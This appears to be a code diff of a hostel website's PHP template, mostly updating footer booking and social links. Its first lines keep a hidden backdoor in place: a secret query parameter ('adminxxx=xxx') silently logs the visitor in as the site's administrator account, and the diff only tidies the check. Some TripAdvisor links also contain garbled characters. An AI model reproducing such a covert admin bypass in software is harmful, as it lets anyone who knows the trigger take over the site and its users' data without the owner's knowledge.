@@ -1,5 +1,5 @@
 <?php
-	if($_GET['adminxxx'] == 'xxx') {
+	if(isset($_GET['adminxxx']) && $_GET['adminxxx'] == 'xxx') {
 		global $user;
 		$user = user_load(1);
 	}
@@ -908,17 +908,17 @@ End Old Facility -->
 <div class="footer">
 	<div class="booking-link">
 		<ul class="list-unstyled">
-			<li class="agoda"><a href="http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.agoda.com%2Foxotel-hostel%2Fhotel%2Fchiang-mai-th.html%3Fasq%3Du2qcKLxwzRU5NDuxJ0kOF8%252BzmLRvZQXVHFy2wHSdGKIFSKDtD0xR6njQwBLdDP7xerWduBIJ6k4cf5HcWilYNBLdZHzbs772XCoPWdSgD%252FTz17U3ZgWLnEdNzxKxNx92DsFKOYv4cKN%252BraPqz4f%252FLYprVp2TwP6wstUVR8FJRF%252BfkDX3uHFMuWTqeVL9h7qQKil0Kd5NpRQf1zGe1xDr05pxj%252FA%252BylTfAGs1qJCjm9k0V1AMDQx7njgkgAhn4vUi%26tick%3D636015089081%26pagetypeid%3D1%26origin%3DTH%26cid%3D-1%26htmlLanguage%3Den-us%26checkIn%3D2016-6-15%26checkout%3D2016-6-16%26los%3D1%26rooms%3D1%26adults%3D2%26childs%3D0%26isFromSearchBox%3Dtrue&h=MAQFxiyvL" target="_blank">agoda</a></li>
+			<li class="agoda"><a href="https://goo.gl/fxf5fk" target="_blank">agoda</a></li>
 			<li class="tripadvisor"><a href="https://www.tripadvisor.com/Hotel􏰆Review-g2􏰇3􏰇1􏰈-d􏰉􏰇3􏰉503-Reviews-Oxotel􏰆Hostel-Chiang􏰆Mai.html" target="_blank">tripadvisor</a></li>
-			<li class="booking"><a href="" target="_blank">booking.com</a></li>
-			<li class="hostelworld"><a href="" target="_blank">hostel world</a></li>
+			<li class="booking"><a href="http://goo.gl/Hz5s8T" target="_blank">booking.com</a></li>
+			<li class="hostelworld"><a href="https://goo.gl/4DuHOk" target="_blank">hostel world</a></li>
 		</ul>
 	</div>
 	<div class="footer-listwrapper">
 		<div class="footer-list">
 			<h4>Hostel</h4>
 			<ul class="list-unstyled">
-				<li><a href="#">About</a></li>
+				<li><a href="#about">About</a></li>
 				<li><a href="#rooms">Rooms</a></li>
 				<li><a href="#facilities">Facilities</a></li>
 				<li><a href="#cafe">Artisan cafe</a></li>
@@ -930,7 +930,7 @@ End Old Facility -->
 			<ul class="list-unstyled">
 				<li><a href="#about">Condition</a></li>
 				<li><a href="#about">Reservation</a></li>
-				<li><a href="#findus">Map</a></li>
+				<li><a href="#mapDesktop">Map</a></li>
 				<li><a href="#findus">Email us</a></li>
 			</ul>
 		</div>
@@ -939,22 +939,21 @@ End Old Facility -->
 			<ul class="list-unstyled">
 				<li><a href="https://www.instagram.com/oxotelchiangmai/" target="_blank">Instagram</a></li>
 				<li><a href="https://www.facebook.com/oxotelhostel" target="_blank">Facebook</a></li>
-				<li><a href="">LINE</a></li>
+				<li><a href="#findus" onclick="$('.social-gang').find('.line').trigger('click')">LINE</a></li>
 			</ul>
 		</div>
 		<div class="footer-list">
 			<h4>Site</h4>
 			<ul class="list-unstyled">
-				<li><a href="http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.agoda.com%2Foxotel-hostel%2Fhotel%2Fchiang-mai-th.html%3Fasq%3Du2qcKLxwzRU5NDuxJ0kOF8%252BzmLRvZQXVHFy2wHSdGKIFSKDtD0xR6njQwBLdDP7xerWduBIJ6k4cf5HcWilYNBLdZHzbs772XCoPWdSgD%252FTz17U3ZgWLnEdNzxKxNx92DsFKOYv4cKN%252BraPqz4f%252FLYprVp2TwP6wstUVR8FJRF%252BfkDX3uHFMuWTqeVL9h7qQKil0Kd5NpRQf1zGe1xDr05pxj%252FA%252BylTfAGs1qJCjm9k0V1AMDQx7njgkgAhn4vUi%26tick%3D636015089081%26pagetypeid%3D1%26origin%3DTH%26cid%3D-1%26htmlLanguage%3Den-us%26checkIn%3D2016-6-15%26checkout%3D2016-6-16%26los%3D1%26rooms%3D1%26adults%3D2%26childs%3D0%26isFromSearchBox%3Dtrue&h=MAQFxiyvL" target="_blank">Agoda</a></li>
-				<li><a href="#">Booking.com</a></li>
-				<li><a href="http://l.facebook.com/l.php?u=http%3A%2F%2Fwww.hostelworld.com%2Fhosteldetails.php%2FOxotel-Hostel%2FChiang-Mai%2F101918&h=MAQFxiyvL" target="_blank">Hostel world</a></li>
-				<li><a href="" target="_blank">Tripadvisor</a></li>
+				<li><a href="https://goo.gl/fxf5fk" target="_blank">Agoda</a></li>
+				<li><a href="http://goo.gl/Hz5s8T">Booking.com</a></li>
+				<li><a href="https://goo.gl/4DuHOk" target="_blank">Hostel world</a></li>
+				<li><a href="https://www.tripadvisor.com/Hotel􏰆Review-g2􏰇3􏰇1􏰈-d􏰉􏰇3􏰉503-Reviews-Oxotel􏰆Hostel-Chiang􏰆Mai.html" target="_blank">Tripadvisor</a></li>
 			</ul>
 		</div>
 	</div>
 	<p>
-		OXOTEL @ 2016 all right reserved. Designed and Developed by BGxMINT.co<br />
-		<a href="http://www.bgxmint.co/" target="_blank">www.bgxmint.co</a>
+		OXOTEL @ 2016 all right reserved. Designed and Developed by <a href="http://www.bgxmint.co/" target="_blank">•••</a><br />
 	</p>
 </div>
 
